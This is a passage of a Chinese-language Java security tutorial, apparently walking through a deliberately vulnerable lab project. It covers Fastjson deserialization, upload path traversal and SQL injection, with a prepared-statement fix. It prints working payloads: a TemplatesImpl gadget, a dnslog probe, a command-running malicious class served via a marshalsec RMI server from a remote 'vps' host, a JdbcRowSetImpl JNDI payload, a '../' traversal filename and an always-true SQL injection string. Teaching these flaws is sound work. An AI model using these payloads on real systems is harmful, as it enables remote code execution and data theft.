\u65E0\u8BBA\u9009\u62E9\u54EA\u79CD\u5904\u7406JSON\u5B57\u7B26\u4E32\u7684\u65B9\u6CD5\uFF0C\u76EE\u6807\u7C7B\u4E2D\u7B26\u5408\u6761\u4EF6\u7684getter\u6216setter\u65B9\u6CD5\u90FD\u6709\u53EF\u80FD\u88AB\u8C03\u7528\u3002\u5982\u679C\u67D0\u4E2A\u7C7B\u7684getter\u6216setter\u65B9\u6CD5\u6EE1\u8DB3\u8C03\u7528\u6761\u4EF6\u4E14\u5B58\u5728\u53EF\u5229\u7528\u70B9\uFF0C\u5C31\u4F1A\u5F62\u6210\u653B\u51FB\u94FE\u3002

\u6F0F\u6D1E\u4EE3\u7801\uFF1A

@RequestMapping(value = "/deserialize", method = {RequestMethod.POST})
@ResponseBody
public String Deserialize(@RequestBody String params) {
// \u5982\u679CContent-Type\u4E0D\u8BBE\u7F6Eapplication/json\u683C\u5F0F\uFF0Cpost\u6570\u636E\u4F1A\u88ABurl\u7F16\u7801
try {
// \u5C06post\u63D0\u4EA4\u7684string\u8F6C\u6362\u4E3Ajson
JSONObject ob = JSON.parseObject(params);
return ob.get("name").toString();
} catch (Exception e) {
return e.toString();
}
}
public static void main(String[] args) {
// Open calc in mac
String payload = "{\\"@type\\":\\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\", \\"_bytecodes\\": [\\"base64\u53CD\u5E8F\u5217\u5316\u6570\u636E\\"], \\"_name\\": \\"lightless\\", \\"_tfactory\\": { }, \\"_outputProperties\\":{ }}";
JSON.parseObject(payload, Feature.SupportNonPublicField);
}
}

\u4F20\u5165payload \u770Bdnslog

{"name":{"@type":"java.net.Inet4Address","val":"w2b6lu.dnslog.cn"}}

![](https://xzfile.aliyuncs.com/media/upload/picture/20241112221200-15b10b00-a100-1.png)

\u6076\u610F\u7C7Bpoc\u6784\u9020\u5982\u4E0B

package exp;// TouchFile.java
import java.lang.Runtime;
import java.lang.Process;
public class poc {
static {
try {
Runtime rt = Runtime.getRuntime();
String[] commands = {"touch", "/tmp/success"};
Process pc = rt.exec(commands);
pc.waitFor();
} catch (Exception e) {
// do nothing
}
}
}

\u7F16\u8BD1\u4EE3\u7801,\u4E0A\u4F20\u81F3\u670D\u52A1\u5668\uFF0C\u6211\u5728\u672C\u5730\u4F7F\u7528Python http.server \u8FDB\u884C\u642D\u5EFA

\`\`\`
javac TouchFile.java          //\u8FDB\u884C\u7F16\u8BD1  
python3 -m http.server 8888   //\u7B80\u5355\u642D\u5EFAweb\u670D\u52A1
\`\`\`

\u4F7F\u7528[marshalsec](https://github.com/mbechler/marshalsec)\u9879\u76EE\uFF0C\u542F\u52A8\u4E00\u4E2ARMI\u670D\u52A1\u5668\uFF0C\u76D1\u542C8888\u7AEF\u53E3\uFF0C\u5E76\u5236\u5B9A\u52A0\u8F7D\u8FDC\u7A0B\u7C7B\`poc.class\`\u3002

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://vps:8888/#poc" 1099

\u4E4B\u540E\u8FDB\u884C\u53CD\u5E8F\u5217\u5316

{
"b":{
"@type":"com.sun.rowset.JdbcRowSetImpl",
"dataSourceName":"rmi://vps:1099/poc",
"autoCommit":true
}
}

## FileUpload

\u5BF9\u4E8E\u6587\u4EF6\u4E0A\u4F20\u6765\u8BF4\uFF0C\u76EE\u524D\u8FD9\u7C7B\u6F0F\u6D1E\u5728spring\u91CC\u975E\u5E38\u5C11\uFF0C\u539F\u56E0\u6709\u4E24\u70B9\uFF1A

1. \u5927\u591A\u6570\u516C\u53F8\u4E0A\u4F20\u7684\u6587\u4EF6\u90FD\u4F1A\u5230cdn
2. spring\u7684jsp\u6587\u4EF6\u5FC5\u987B\u5728web-inf\u76EE\u5F55\u4E0B\u624D\u80FD\u6267\u884C\uFF0C\u91CC\u9762\u7684\u8D44\u6E90\u4E0D\u80FD\u88AB\u76F4\u63A5\u8BBF\u95EE\uFF0C\u53EA\u6709\u901A\u8FC7\u63A7\u5236\u5668\u624D\u80FD\u8BBF\u95EE\u5230

\u9664\u975E\uFF0C\u53EF\u4EE5\u4E0A\u4F20war\u5305\u5230tomcat\u7684webapps\u76EE\u5F55\u3002

\u6F0F\u6D1E\u4EE3\u7801\u5982\u4E0B

@Controller
@RequestMapping("/file")
public class FileUpload {
// Save the uploaded file to this folder
private static final String UPLOADED_FOLDER = "/tmp/";
private final Logger logger = LoggerFactory.getLogger(this.getClass());
private static String randomFilePath = "";
// uplaod any file
@GetMapping("/any")
public String index() {
return "upload"; // return upload.html page
}
// only allow to upload pictures
@GetMapping("/pic")
public String uploadPic() {
return "uploadPic"; // return uploadPic.html page
}
@PostMapping("/upload")
public String singleFileUpload(@RequestParam("file") MultipartFile file,
RedirectAttributes redirectAttributes) {
if (file.isEmpty()) {
// \u8D4B\u503C\u7ED9uploadStatus.html\u91CC\u7684\u52A8\u6001\u53C2\u6570message
redirectAttributes.addFlashAttribute("message", "Please select a file to upload");
return "redirect:/file/status";
}
try {
// Get the file and save it somewhere
byte[] bytes = file.getBytes();
Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());
Files.write(path, bytes);
redirectAttributes.addFlashAttribute("message",
"You successfully uploaded '" + UPLOADED_FOLDER + file.getOriginalFilename() + "'");
} catch (IOException e) {
redirectAttributes.addFlashAttribute("message", "upload failed");
logger.error(e.toString());
}
return "redirect:/file/status";
}
@GetMapping("/status")
public String uploadStatus() {
return "uploadStatus";
}
// only upload picture
@PostMapping("/upload/picture")
@ResponseBody
public String uploadPicture(@RequestParam("file") MultipartFile multifile) throws Exception {
if (multifile.isEmpty()) {
return "Please select a file to upload";
}
String fileName = multifile.getOriginalFilename();
String Suffix = fileName.substring(fileName.lastIndexOf(".")); // \u83B7\u53D6\u6587\u4EF6\u540E\u7F00\u540D
String mimeType = multifile.getContentType(); // \u83B7\u53D6MIME\u7C7B\u578B
String filePath = UPLOADED_FOLDER + fileName;
File excelFile = convert(multifile);
// \u5224\u65AD\u6587\u4EF6\u540E\u7F00\u540D\u662F\u5426\u5728\u767D\u540D\u5355\u5185  \u6821\u9A8C1
String[] picSuffixList = {".jpg", ".png", ".jpeg", ".gif", ".bmp", ".ico"};
boolean suffixFlag = false;
for (String white_suffix : picSuffixList) {
if (Suffix.toLowerCase().equals(white_suffix)) {
suffixFlag = true;
break;
}
}
if (!suffixFlag) {
logger.error("[-] Suffix error: " + Suffix);
deleteFile(filePath);
return "Upload failed. Illeagl picture.";
}
// \u5224\u65ADMIME\u7C7B\u578B\u662F\u5426\u5728\u9ED1\u540D\u5355\u5185 \u6821\u9A8C2
String[] mimeTypeBlackList = {
"text/html",
"text/javascript",
"application/javascript",
"application/ecmascript",
"text/xml",
"application/xml"
};
for (String blackMimeType : mimeTypeBlackList) {
// \u7528contains\u662F\u4E3A\u4E86\u9632\u6B62text/html;charset=UTF-8\u7ED5\u8FC7
if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) {
logger.error("[-] Mime type error: " + mimeType);
deleteFile(filePath);
return "Upload failed. Illeagl picture.";
}
}
// \u5224\u65AD\u6587\u4EF6\u5185\u5BB9\u662F\u5426\u662F\u56FE\u7247 \u6821\u9A8C3
boolean isImageFlag = isImage(excelFile);
deleteFile(randomFilePath);
if (!isImageFlag) {
logger.error("[-] File is not Image");
deleteFile(filePath);
return "Upload failed. Illeagl picture.";
}
try {
// Get the file and save it somewhere
byte[] bytes = multifile.getBytes();
Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());
Files.write(path, bytes);
} catch (IOException e) {
logger.error(e.toString());
deleteFile(filePath);
return "Upload failed";
}
logger.info("[+] Safe file. Suffix: {}, MIME: {}", Suffix, mimeType);
logger.info("[+] Successfully uploaded {}", filePath);
return String.format("You successfully uploaded '%s'", filePath);
}
private void deleteFile(String filePath) {
File delFile = new File(filePath);
if(delFile.isFile() && delFile.exists()) {
if (delFile.delete()) {
logger.info("[+] " + filePath + " delete successfully!");
return;
}
}
logger.info(filePath + " delete failed!");
}
}

\u5BF9\u6587\u4EF6\u540D\u505A\u4E86\u767D\u540D\u5355\u9650\u5236\uFF0C\u5E76\u9632\u6B62text/html;charset=UTF-8\u7ED5\u8FC7\uFF0C\u4F7F\u7528IsImage()\u51FD\u6570\u8C03\u7528ImageIO.read()\u51FD\u6570\u6765\u68C0\u6D4B\u5185\u5BB9\u662F\u5426\u4E3A\u6587\u4EF6\uFF0C\u4E0A\u4F20\u6587\u4EF6\u65F6\u4F1A\u901A\u8FC7uuid\u751F\u6210\u4E00\u4E2A\u2019/tmp\u2019 + uuid + \u2018png\u2019 \u8FD9\u6837\u7684\u6587\u4EF6\u540D\uFF0C\u7136\u540E\u6700\u540E\u5220\u9664\u6389\u3002

\u5B58\u5728\u672A\u5BF9\u6587\u4EF6\u540D\u505A\u6821\u9A8C\uFF0C\u5B58\u5728\u8DEF\u5F84\u7A7F\u8D8A\u6F0F\u6D1E\uFF0C\u6211\u4EEC\u53EF\u4EE5\u4E0A\u4F20\u56FE\u7247\u5230\u4EFB\u610F\u76EE\u5F55payload:

\`\`\`
../../Users/oldthree/Documents/0.OL4THREE/0.Base/apache-tomcat-8.5.70/webapps/java_sec_code_war/1.png\`
\`\`\`

## SQLI\u6CE8\u5165

\u5148\u770B\u6F0F\u6D1E\u4EE3\u7801\uFF1A

@SuppressWarnings("Duplicates")
@RestController
@RequestMapping("/sqli")
public class SQLI {
private static final Logger logger = LoggerFactory.getLogger(SQLI.class);
// com.mysql.jdbc.Driver is deprecated. Change to com.mysql.cj.jdbc.Driver.
private static final String driver = "com.mysql.cj.jdbc.Driver";
@Value("\${spring.datasource.url}")
private String url;
@Value("\${spring.datasource.username}")
private String user;
@Value("\${spring.datasource.password}")
private String password;
@Resource
private UserMapper userMapper;
/**
* Sql injection jbdc vuln code.
*
* http://localhost:8080/sqli/jdbc/vuln?username=joychou
*/
@RequestMapping("/jdbc/vuln")
public String jdbc_sqli_vul(@RequestParam("username") String username) {
StringBuilder result = new StringBuilder();
try {
Class.forName(driver);
Connection con = DriverManager.getConnection(url, user, password);
if (!con.isClosed())
System.out.println("Connect to database successfully.");
// sqli vuln code
Statement statement = con.createStatement();
String sql = "select * from users where username = '" + username + "'";
logger.info(sql);
ResultSet rs = statement.executeQuery(sql);
while (rs.next()) {
String res_name = rs.getString("username");
String res_pwd = rs.getString("password");
String info = String.format("%s: %s\\n", res_name, res_pwd);
result.append(info);
logger.info(info);
}
rs.close();
con.close();
} catch (ClassNotFoundException e) {
logger.error("Sorry, can't find the Driver!");
} catch (SQLException e) {
logger.error(e.toString());
}
return result.toString();
}
}

\u62FC\u63A5\u5B58\u5728sql\u6CE8\u5165\u6F0F\u6D1E\uFF0Cpayload\u5982\u4E0B\u53EF\u4EE5\u83B7\u53D6\u6240\u6709\u8D26\u6237\u6570\u636E

\`\`\`
aaa' or '1'='1
\`\`\`

\u4FEE\u590D\u4EE3\u7801
prepareStatement()\u901A\u8FC7\u9884\u5904\u7406\u65B9\u5F0F\u8FDB\u884C\u4FEE\u590D

\u9884\u5904\u7406\u7684\u4FEE\u590D\u539F\u7406\uFF1A\u9488\u5BF9\u5B57\u7B26\u4E32\u7C7B\u578B\u7684SQL\u6CE8\u5165\uFF0C\u662F\u5728\u5B57\u7B26\u4E32\u4E24\u8FB9\u52A0\u4E0A\u4E00\u5BF9\u5355\u53F7\u54C8\`''\`\uFF0C\u5BF9\u4E8E\u4E2D\u95F4\u70B9\u7684\u5355\u5F15\u53F7\u5BF9\u5176\u8FDB\u884C\u8F6C\u4E49\`\\'\`\uFF0C\u8BA9\u5176\u53D8\u6210\u5B57\u7B26\u7684\u5355\u5F15\u53F7\u3002Mybatis\u7684\`#{}\`\u4E5F\u662F\u9884\u5904\u7406\u65B9\u5F0F\u5904\u7406SQL\u6CE8\u5165\u3002

\u5728\u4F7F\u7528\u4E86mybatis\u6846\u67B6\u540E\uFF0C\u9700\u8981\u8FDB\u884C\u6392\u5E8F\u529F\u80FD\u65F6\uFF0C\u5728mapper.xml\u6587\u4EF6\u4E2D\u7F16\u5199SQL\u8BED\u53E5\u65F6\uFF0C\u6CE8\u610ForderBy\u540E\u7684\u53D8\u91CF\u8981\u4F7F\u7528\`\${}\`,\u800C\u4E0D\u7528\`#{}\`\u3002\u56E0\u4E3A\`#{}\`\u53D8\u91CF\u662F\u7ECF\u8FC7\u9884\u7F16\u8BD1\u7684\uFF0C\`\${}\`\u6CA1\u6709\u7ECF\u8FC7\u9884\u7F16\u8BD1\u3002\u867D\u7136\`\${}\`\u5B58\u5728SQL\u6CE8\u5165\u7684\u98CE\u9669\uFF0C\u4F46orderBy\u5FC5\u987B\u4F7F\u7528\`\${}\`\uFF0C\u56E0\u4E3A\`#{}\`\u4F1A\u591A\u51FA\u5355\u5F15\u53F7\`''\`\u5BFC\u81F4SQL\u8BED\u53E5\u5931\u6548\u3002\u4E3A\u9632\u6B62SQL\u6CE8\u5165\u53EA\u80FD\u81EA\u5DF1\u5BF9\u5176\u8FC7\u6EE4\u3002

@RequestMapping("/jdbc/sec")
public String jdbc_sqli_sec(@RequestParam("username") String username) {
StringBuilder result = new StringBuilder();
try {
Class.forName(driver);
Connection con = DriverManager.getConnection(url, user, password);
if (!con.isClosed())
System.out.println("Connecting to Database successfully.");
// fix code
String sql = "select * from users where username = ?";
PreparedStatement st = con.prepareStatement(sql);
st.setString(1, username);
logger.info(st.toString());  // sql after prepare statement
ResultSet rs = st.executeQuery();
while (rs.next()) {
String res_name = rs.getString("username");
String res_pwd = rs.getString("password");
String info = String.format("%s: %s\\n", res_name, res_pwd);
result.append(info);
logger.info(info);
}
rs.close();
con.close();
} catch (ClassNotFoundException e) {
logger.error("Sorry, can\`t find the Driver!");
e.printStackTrace();
} catch (SQLException e) {
logger.error(e.toString());
}
return result.toString();
}`;export{e as _};
